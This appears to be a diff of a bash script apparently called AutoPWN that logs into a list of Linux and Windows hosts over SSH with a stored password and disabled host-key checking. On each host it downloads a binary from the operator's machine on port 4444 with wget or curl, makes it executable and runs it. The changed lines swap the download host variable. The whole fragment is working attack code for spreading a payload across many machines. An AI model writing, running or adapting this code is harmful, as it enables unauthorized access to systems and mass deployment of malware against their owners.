@@ -1,6 +1,6 @@
 #!/bin/bash
 
-version="1.9"
+version="1.1"
 
 # Variables
 youripalways=`ifconfig | grep -Eo 'inet (addr:)?([0-9]*\.){3}[0-9]*' | grep -Eo '([0-9]*\.){3}[0-9]*' | grep -v '127.0.0.1'`
@@ -209,9 +209,9 @@ ip=$(sed "${i}q;d" "AutoPWN/ips.txt")
     fi
         
     if echo "$OS" | grep -q "LINUX"; then
-        output=$(timeout 9 sshpass -p "$sshpassword" ssh -o StrictHostKeyChecking=no "$sshuser"@"$ip" "cd $linworkdir && echo old > $linuxoutname && rm -f $linuxoutname && wget http://$lhost:4444/$linuxoutname && chmod 777 $linuxoutname && echo correcto && ./$linuxoutname" 2>&1)
+        output=$(timeout 9 sshpass -p "$sshpassword" ssh -o StrictHostKeyChecking=no "$sshuser"@"$ip" "cd $linworkdir && echo old > $linuxoutname && rm -f $linuxoutname && wget http://$youripalways:4444/$linuxoutname && chmod 777 $linuxoutname && echo correcto && ./$linuxoutname" 2>&1)
     elif echo "$OS" | grep -q "WINDOWS"; then
-        output=$(timeout 9 sshpass -p "$sshpassword" ssh -o StrictHostKeyChecking=no "$sshuser"@"$ip" "cd \"$winworkdir\" & taskkill /F /IM \"$windowsoutname\" & del \"$windowsoutname\" & curl \"http://$lhost:4444/$windowsoutname\" --output $windowsoutname & echo correcto & call $windowsoutname" 2>&1)
+        output=$(timeout 9 sshpass -p "$sshpassword" ssh -o StrictHostKeyChecking=no "$sshuser"@"$ip" "cd \"$winworkdir\" & taskkill /F /IM \"$windowsoutname\" & del \"$windowsoutname\" & curl \"http://$youripalways:4444/$windowsoutname\" --output $windowsoutname & echo correcto & call $windowsoutname" 2>&1)
     fi
         
     echo "$output" >> AutoPWN/SSHlog.txt
